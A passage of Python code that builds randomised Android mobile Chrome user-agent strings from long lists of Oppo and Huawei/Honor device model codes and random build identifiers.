'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
                self.build = (f"{random.choice(['SP1A', 'QP1A', 'RP1A', 'TP1A', 'RKQ1', 'SKQ1'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Huawei" in str(self.device):
                self.android_model = random.choice(['POT-AL00a', 'POT-TL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'Huawei Ascend', 'U9500', 'U9500', 'U9500', 'U9500', 'U9500', 'U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'U8818', 'U8818', 'U8818', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'HUAWEI G6-L11', 'G620S-L01', 'C8817D', 'G620S-L03', 'G620S-L01', 'C8817D', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G7-L01', 'HUAWEI G7-L01', 'Huawei G700', 'HUAWEI G700-U20', 'HUAWEI G700-T00', 'HUAWEI G700-U10', 'Huawei g700', 'HUAWEI G700-U00', 'HUAWEI G700-T00', 'HUAWEI G700-U20', 'HUAWEI G700-U10', 'HUAWEI G700-U00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI MT1-U06', 'HUAWEI MT1-U06', 'HUAWEI MT2-L01', 'HUAWEI MT2-L01', 'HUAWEI MT2-C00', 'HUAWEI MT2-C00', 'MT2L03', 'MT2L03', 'HUAWEI Y360', 'HUAWEI MT7-L09', 'HUAWEI MT7-TL10', 'HUAWEI MT7-TL00', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-1', 'U9202L-1', 'U9202L-4', 'U9202L-2', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-2', 'HUAWEI P6 S-U06', 'HUAWEI P7-L10', 'Flow', 'H1711', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'HUAWEI Y221-U12', 'HUAWEI Y221-U03', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'Bucare Y330-U05', 'Bucare Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'Y550-L03', 'HUAWEI Y560-L01', 'HUAWEI Y541-U02', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'Huawei Blaze', 'Huawei BLAZE', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199s', 'HUAWEI C199s', 'HW-HUAWEI C199s', 'EC6109V1', 'MTS-SP101', 'MTS-SP101', 'MTS-SP101', 'C8512', 'C8600', 'C8600', 'C8600', 'C8600', 'C8650', 'C8650', 'id C8650', 'HUAWEI C8655', 'HUAWEI C8655', 'C8800', 'HW-HUAWEI_C8810', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI_C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812E', 'HUAWEI_C8812E', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813DQ', 'HUAWEI C8813DQ', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8815', 'HUAWEI C8815', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI_C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI-C8850', 'HUAWEI C8860E', 'HUAWEI C8860E', 'HUAWEI C8860E', 'C8860V', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'CM980', 'CM980', 'd-02K', 'd-02H', 'd-01J', 'U9510', 'U9510', 'HUAWEI D2', 'Huawei D2', 'HUAWEI D8950D', 'MediaPad 10 FHD', 'dtab01', 'EC6108V9-01', 'ART-AL00x', 'ART-AL00x', 'ART-AL00x', 'ART-TL00x', 'ART-AL00m', 'ART-AL00x', 'STK-AL00', 'STK-AL00', 'STK-AL00', 'STK-TL00', 'MED-TL00', 'MED-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-TL00', 'WKG-AN00', 'WKG-AN00', 'WKG-TN00', 'WKG-TN00', 'FRL-TN00', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-TN00', 'FRL-AN00a', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'DVC-AN20', 'DVC-AN20', 'DVC-AN20', 'DVC-TN20', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'MLD-AL00', 'MLD-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'HUAWEI TAG-L01', 'HUAWEI TAG-L32', 'HUAWEI TAG-AL00', 'HUAWEI TAG-L21', 'HUAWEI TAG-L13', 'HUAWEI TAG-L03', 'NCE-TL10', 'NCE-AL10', 'NCE-AL00', 'NCE-TL10', 'NCE-AL00', 'NCE-AL10', 'DIG-TL10', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'SLA-TL10', 'SLA-AL00', 'SLA-TL10', 'SLA-TL10', 'TRT-AL00A', 'TRT-TL10A', 'FIG-AL10', 'FIG-TL10', 'FIG-AL00', 'FIG-TL00', 'FIG-AL10', 'LDN-TL20', 'LDN-AL20', 'LDN-AL10', 'LDN-TL00', 'LDN-TL20', 'FLA-AL10', 'FLA-AL10', 'FLA-AL10', 'ATU-AL10', 'DUB-AL00a', 'DUB-AL00a', 'DUB-AL00a', 'MRD-AL00', 'Huawei Enjoy 9s', 'Huawei Enjoy 9s', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'CM990', 'CM990', 'CM990', 'U8665', 'HUAWEI U8665', 'U8665', 'G735-L03', 'G735-L23', 'G735-L12', 'G735-L23', 'G735-L23', 'CHC-U03', 'CHC-U01', 'Huawei G500 pro', 'HUAWEI G510', 'HUAWEI G510', 'Huawei G510', 'Huawei G520', 'HUAWEI G520 T', 'HUAWEIG520L', 'HUAWEI G520T', 'Huawei G530', 'Huawei G600', 'Huawei G610 u20', 'Huawei G610', 'HUAWEI G610', 'HUAWEI G610 fa', 'HUAWEI G620', 'G621-TL00', 'G621-TL00M', 'G621-TL00', 'HUAWEI G628', 'HUAWEI G7', 'HUAWEI RIO-TL00', 'HUAWEI RIO-UL00', 'HUAWEI_G750', 'Huawei_g750', 'HUAWEI G750', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'Huawei G760', 'HUAWEI RIO-L01', 'HUAWEI VNS-AL00', 'HUAWEI VNS-TL00', 'HUAWEI MLA-TL00', 'HUAWEI MLA-TL00', 'HUAWEI G9 Youth', 'DIG-L21', 'DIG-L22', 'HUAWEI KII-L21', 'BLL-L22', 'BLL-L21', 'BLL-L21', 'HUAWEI NMO-L31', 'HUAWEI RIO-L03', 'H1611', 'H1611', 'H1621', 'H1621', 'HUAWEI H1621', 'H1623', 'H710VL', 'H715BL', 'H866C', 'H866C', 'H866C', 'H866C', 'H866C', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'HUAWEI H868C', 'HUAWEIH868C', 'HUAWEI H868C', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI_H881C', 'H882L', 'H882L', 'HUAWEI H891L', 'HUAWEI H892L', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'HUAWEI U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'COL-L29', 'COL-AL10', 'COL-L29', 'HRY-LX1', 'HRY-LX1MEB', 'HRY-AL00', 'HRY-AL00a', 'HRY-LX1T', 'HUAWEI U9508', 'HUAWEI U9508', 'HUAWEI U9508', 'YAL-L21', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-L41', 'YAL-L41', 'HRY-AL00T', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00T', 'HRY-AL00Ta', 'YAL-AL50', 'MAR-LX1H', 'MAR-LX1H', 'BMH-AN20', 'BMH-AN10', 'BMH-AN10', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-TN00', 'MXW-AN00', 'MXW-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN10', 'EBG-AN10', 'LRA-LX1', 'CDY-NX9A', 'CDY-AN95', 'CDY-AN90', 'HONOR H30-L01M', 'H30-U10', 'H30-T10', 'H30-T00', 'H30-C00', 'Hol-U19', 'Hol-U19', 'Hol-U19', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'SCL-AL00', 'SCL-TL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-CL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-AL00', 'CHM-U01', 'Honor 4c Pro', 'Honor 4c pro', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'Che1-CL20', 'Che2-UL00', 'Che2-TL00M', 'CHE2-TL00', 'CHE-TL00', 'Che1-CL10', 'Che2-TL00', 'CHE-TL00H', 'Che2-L11', 'CUN-AL00', 'CUN-TL00', 'CUN-TL00', 'NTH-AN00', 'NTH-NX9', 'NTH-AN00', 'NTN-L22', 'NTN-LX3', 'NTN-LX1', 'RNA-AN00', 'JLH-AN00', 'JLH-AN00', 'CAM-AL00', 'CAM-TL00', 'CAM-AL00', 'NEM-AL10', 'NEM-L51', 'NEM-UL10', 'NEM-L51', 'NEM-L22', 'KIW-L21', 'KIW-AL10', 'KIW-UL00', 'KIW-TL00', 'H60-L02', 'H60-L04', 'H60-L01', 'H60-L02', 'H60-L03', 'H60-L11', 'H60-L01', 'MYA-TL10', 'huawei mya-tl10', 'PE-UL00', 'PE-TL20', 'PE-UL00', 'PE-TL10', 'PE-UL00', 'PE-TL10', 'GIA-AN00', 'DLI-TL20', 'DLI-L22', 'DLI-L42', 'DIG-L21HN', 'JMM-L22', 'BLN-L21', 'BLN-L22', 'BLN-AL10', 'BLN-AL10', 'BLN-AL30', 'PLK-AL10', 'PLK-UL00', 'PLK-L01', 'PLK-AL10', 'PLK-TL01H', 'PLK-UL00', 'NEM-L21', 'FNE-AN00', 'FNE-AN00', 'FNE-NX9', 'AUM-AL20', 'AUM-L33', 'AUM-AL00', 'AUM-TL20', 'AUM-AL20', 'AUM-L29', 'AUM-L41', 'LND-AL30', 'LND-L29', '720x1358', 'ATH-AL00', 'ATH-CL00', 'ATH-TL00H)', 'ATH-UL00)', 'ATH-AL00', 'ATH-AL00', 'ATH-AL00', 'ATH-TL00H', 'DUA-L22', 'DUA-LX3', 'BND-AL10', 'BND-L21', 'FRD-L09', 'FRD-AL00', 'FRD-L19', 'PRA-AL00X', 'PRA-TL10', 'DUK-L09', 'VEN-L22', 'JAT-L29', 'JAT-LX3', 'JAT-LX1', 'JAT-L41', 'BKK-AL10', 'BKK-LX2', 'BKK-L21', 'BKK-LX2', 'KSA-LX9', 'KSA-LX9', 'JSN-L21', 'JSN-L22', 'JSN-AL00a', 'JSN-L23', 'ARE-AL00', 'ARE-L22HN', 'STF-L09', 'STF-L09S', 'STF-AL10', 'STF-AL10', 'STF-AL00', 'LLD-L31', 'LLD-AL10', 'MOA-LX9N', 'U', '720x1470', 'AKA-L29', 'LLD-AL20', 'LLD-AL30', 'LLD-AL20', 'LLD-AL20', 'DUA-LX9', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00a', 'HLK-AL00', 'HLK-L42', 'HLK-AL10', 'HLK-L41', 'HLK-AL10', 'HLK-AL10', 'CAM-UL00', 'CAM-UL00', 'NTS-AL00', 'NTS-AL00', 'NTS-AL00', 'TNY-AL00', 'TNY-TL00', 'TNY-AL00', 'TNY-AL00', 'ELZ-AN10', 'ELZ-AN20', 'ANY-LX1', 'LGE-NX9', 'LGE-AN10', 'LGE-AN20', 'MGI-AN00', 'PGT-N19', 'RVL-AL09', 'RVL-AL09', 'RVL-AL09', 'EDI-AL10', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'ANA-AL00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-NX9', 'JDN-W09', 'JDN-AL00', 'JDN-W09', 'AGR-W09HN', 'COR-L29', 'COR-AL10', 'KOZ-AL00', 'KOZ-AL00', 'KOZ-AL00', 'HJC-LX9', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'KSA-AL10', 'huawei ksa-al10', 'TNNH-AN00', 'TNNH-AN00', 'TNNH-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'CHM-TL00', 'CHM-UL00', 'HW-CHM-CL00', 'CHM-UL00', 'CHM-TL00H', 'CHM-UL00', 'CHM-TL00H', 'CHM-TL00', 'CHM-UL00', 'AKA-AL10', 'HJC-AN90', 'NEW-AN90', 'KOZ-AL40', 'KOZ-AL40', 'DUA-AL00', 'DUA-TL00', 'JAT-AL00', 'MOA-AL00', 'MOA-AL00', 'JDN2-AL00HN', 'JDN2-W09HN', 'AGS2-AL00HN', 'BKL-L09', 'BKL-AL20', 'BKL-AL00', 'PCT-TL10', 'PCT-AL10', 'PCT-AL10', 'ALA-AN70', 'KNT-AL10', 'KNT-AL20', 'KNT-AL20', 'KNT-UL10', 'KNT-TL10', 'DUK-AL20', 'DUK-AL20', 'DUK-AL20', 'JMM-AL00', 'JMM-AL10', 'JMM-TL10', 'JMM-AL00', 'BKL-L04', 'PCT-L29', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN10', 'OXF-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00', 'TEL-AN00a', 'TEL-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-TN00', 'TEL-AN10', 'Honor X10 Lite', 'DNN-LX9', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'Honor X10 Max', 'Honor X10 Pro', 'KKG-AN70', 'TFY-AN00', 'ADT-AN00', 'ADT-AN00', 'DIO-AN00', 'VNA-LX2', 'VNE-LX2', 'VNE-LX1', 'VNE-LX3', 'CMA-LX1', 'CMA-LX2', 'RKY-LX1', 'RKY-LX2', 'RKY-LX3', 'TFY-LX2', 'TFY-LX1', 'TFY-LX3', 'VNE-N41', 'CRT-LX1', 'CRT-LX3', 'CRT-LX2', 'ANY-LX2', 'ANY-LX3', 'ANY-NX1', 'RMO-NX1', 'RMO-NX1', 'HUAWEI SCL-L01', 'HUAWEI SCL-L21', 'HUAWEI LYO-L21', 'LYO-L21', 'Y538', 'Y538', 'Ideos', 'Ideos', 'IDEOS S7', 'IDEOS S7 Slim', 'IDEOS S7 Slim', 'Huawei Ideos X1', 'IDEOS X1', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8510', 'rv:35.0', 'rv:13.0', 'U8510', 'Huawei U8510', 'Huawei IDEOS X3', 'Huawei U8510 X3', 'HUAWEI U8510', 'u8800', 'U8800', 'U8800', 'U8800', 'Huawei Ideos X5', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'Huawei IDEOS X8', 'JNY', 'HUAWEI_M2', 'HUAWEI-M391', 'M650', 'M650', 'M650', 'M660', 'M660', 'M660', 'M660', 'Android 2.3.6', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'Android 2.2.2', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'Huawei M865', 'USCCADR3305', 'USCCADR3305', 'M865', 'USCCADR3305', 'M865', 'M865', 'M865', 'M865', 'Android 2.3.6', 'M865C', 'M865C', 'M865C', 'M865C', 'USCCADR3310', 'USCCADR3310', 'USCCADR3310', 'M866', 'HUAWEI M866', 'USCCADR3310', 'M866', 'HUAWEI M866', 'M866', 'USCCADR3310', 'HUAWEI M868', 'HUAWEI M881', 'HUAWEI M881', 'M886', 'M886', 'M886', 'M886', 'M886', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M921', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI MLA-AL10', 'HUAWEI MLA-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'ALP-AL00', 'ALP-L29', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'RNE-L21', 'RNE-L01', 'RNE-L23', 'BLA-L29', 'BLA-L09', 'BLA-A09', 'BLA-AL00', 'HMA-L29', 'HMA-L09', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-L29', 'SNE-LX1', 'SNE-LX3', 'LYA-L29', 'LYA-L09', 'LYA-AL00', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'EVR-AN00', 'EVR-AL00', 'EVR-AN00', 'EVR-L29', 'EVR-AL00', 'EVR-AL00', 'EVR-N29', 'TAS-AL00', 'TAS-AL00', 'TAS-L29', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'LIO-L29', 'LIO-AN00', 'LIO-L29', 'LIO-AN00', 'LIO-AL00', 'LIO-AN00', 'LIO-AN00', 'LIO-AL00', 'LIO-N29', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'Mate30 RS', 'LIO-AN00P', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'NOH-AL10', 'NOH-NX9', 'NOH-AN00', 'NOH-AN00', 'NOH-AL10', 'NOH-AN01', 'NOH-AN00', 'NOH-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'Mate 40 RS', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'CET-AL00', 'CET-LX9', 'CET-AL00', 'HUAWEI Mate 50', 'CET-AL00', 'DCO-AL00', 'CET-AL60', 'CET-AL60', 'HUAWEI MATE 7', 'HUAWEI NXT-AL10', 'HUAWEI NXT-L29', 'MHA-L29', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-L09', 'BLL-L23', 'LON-L29', 'LON-AL00', 'LON-AL00-PD', 'LON-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-L29', 'HUAWEI CRR-UL00', 'HUAWEI CRR-L09', 'HUAWEI CRR-UL20', 'HUAWEI CRR-CL00', 'BND-L34', 'TAH-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN10', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'PAL-LX9', 'PAL-AL00', 'PAL-AL00', 'PAL-AL00', 'HUAWEI Mate30', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'MON-AL19', 'MON-W19', 'GOT-AL09', 